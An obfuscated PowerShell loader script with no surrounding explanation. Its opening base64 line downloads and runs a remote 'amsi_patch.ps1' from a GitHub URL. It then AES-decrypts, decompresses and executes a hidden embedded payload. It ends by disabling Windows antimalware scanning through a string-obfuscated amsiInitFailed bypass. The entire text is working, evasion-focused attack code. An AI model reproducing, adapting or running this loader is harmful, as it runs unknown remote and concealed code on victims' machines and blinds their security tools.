([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJztbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyO2lleCAoaXdyICJodHRwczovL2dpdGh1Yi5jb20vQ2hhaW5za2kvQUVTLUVuY29kZXIvcmF3L21haW4vYW1zaV9wYXRjaC5wczEiIC11c2ViKQ==")))|i`e`x
$YvRySJI = [cOnvert]::frOMbASe64striNg("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")
$B8koq1U = [CoNVerT]::froMbase64STRing("BF6cQGUiIasr/4cw8BXSD7TM9yZpQWw0V6rw20YOkDU=")
$JBX1AKo = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"
$JBX1AKo.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::CbC
$JBX1AKo.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::anSIx923
$JBX1AKo.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)
$JBX1AKo.kEysIZe = ((10+166-20*2)+(97)+(12+11))
$JBX1AKo.Key = $B8koq1U
$JBX1AKo.Iv = $YvRySJI[0..15]
$4fORnXI = &(GCM *w-o*t) System.IO.MemoryStream
$aSExWcM = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,$JBX1AKo.CreAteDecRYpToR().tRANsFOrMFiNALbLocK($YvRySJI,16,$YvRySJI.Length-16))
$kLXKPuQ = &(GCM *w-o*t) SYSTEm.iO.compressiOn.GzipSTrEAm $aSExWcM, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)
$kLXKPuQ.CopyTo($4fORnXI)
$aSExWcM.Close()
$JBX1AKo.dISPOsE()
$YMnsrCU = [TeXT.EnCOdInG]::UtF8.GetStriNG($4fORnXI.tOARRAY())
$kLXKPuQ.CLoSe()
i`Ex($YMnsrCU)
${byP`Ass} = (-join ([regex]::Matches(("{7}{11}{10}{14}{5}{9}{13}{6}{15}{2}{0}{4}{1}{16}{12}{8}{3}" -f'e2',("{0}{1}"-f '41','6d'),'6',("{2}{0}{1}" -f'9',("{1}{0}"-f '73','6c'),('7'+'46')),'e',('61'+'6'),'6',("{1}{0}{3}{2}"-f'37','5','6',("{1}{2}{0}" -f'65',('97'+'3'),'74')),('95'+'5'),("{3}{2}{0}{1}"-f '6',("{1}{0}"-f('74'+'2'),'e'),'5',("{0}{1}" -f '76',("{0}{1}"-f'5',('6d'+'6')))),'e4','d2','36',("{3}{0}{1}{2}" -f ('41'+'7'),("{1}{0}"-f '46','57'),('f6'+'d'),'e'),("{1}{0}"-f '6e',('d6'+'1')),("{2}{1}{0}" -f("{0}{1}" -f("{0}{1}" -f('46'+'9'),'6'),'f'),'7','1'),'7'), '..') | ForEach-Object { [char]([convert]::ToUInt32(${_}.Value, 16)) }))
${am`si} = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
${aS`sEm`BLY} = [Ref].Assembly
${Ty`PE} = ${ASsemB`LY}.GetType(${ByP`A`Ss})
${fIE`ld} = ${t`Ype}.GetField(${A`msi}, ("{3}{2}{4}{0}{1}" -f("{1}{0}" -f 'ti',('S'+'ta')),'c',('on'+'P'),'N',("{1}{0}" -f("{1}{0}"-f', ',("{0}{1}"-f('b'+'li'),'c')),'u')))
${F`IELd}.SetValue(${N`UlL}, ${TR`Ue})
